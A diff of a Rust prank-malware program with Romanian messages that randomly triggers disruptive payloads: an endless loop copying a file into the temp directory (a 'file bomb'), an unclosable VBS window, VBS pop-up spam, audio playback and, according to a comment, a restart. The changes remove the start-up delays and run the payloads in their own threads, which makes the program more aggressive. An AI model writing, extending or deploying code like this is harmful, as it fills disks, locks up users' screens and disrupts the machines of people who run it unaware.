@@ -168,7 +168,7 @@ fn file_bomb() {
     let mut i = 0;
 
     loop {
-        let destination_path = temp.clone() + i.to_string().as_str();
+        let destination_path = temp.clone() + "oof" + i.to_string().as_str() + ".txt";
         std::fs::copy(source_path, destination_path).ok();
         i += 1;
     }
@@ -222,8 +222,6 @@ fn main() {
     println!("dezastru: 4%"); //file, cpu spam
     println!("nucleara: 1%"); //restart
 
-    println!("armaghedonu: 0%");
-
     loop {
         print!("invarte beleaua dezastrului: Da");
         io::stdout().flush().unwrap();
@@ -248,7 +246,6 @@ fn main() {
             }
             4 => {
                 //mp3
-
                 println!("a picat necazu");
                 thread::Builder::new()
                     .spawn(|| {
@@ -259,24 +256,26 @@ fn main() {
             5 => {
                 //vbs unclosable
                 println!("a picat obraznica");
-                vbs_unclosable();
+                thread::Builder::new()
+                    .spawn(|| {
+                        vbs_unclosable();
+                    })
+                    .unwrap();
             }
             6 => {
                 //vbs spam
                 println!("a picat periculoasa");
                 thread::Builder::new()
                     .spawn(|| {
-                        thread::sleep(Duration::from_secs(7));
                         vbs_spam();
                     })
                     .unwrap();
             }
             7 => {
                 //file bomb
-                println!("a picat periculoasa");
+                println!("a picat dezastru");
                 thread::Builder::new()
                     .spawn(|| {
-                        thread::sleep(Duration::from_secs(7));
                         file_bomb();
                     })
                     .unwrap();
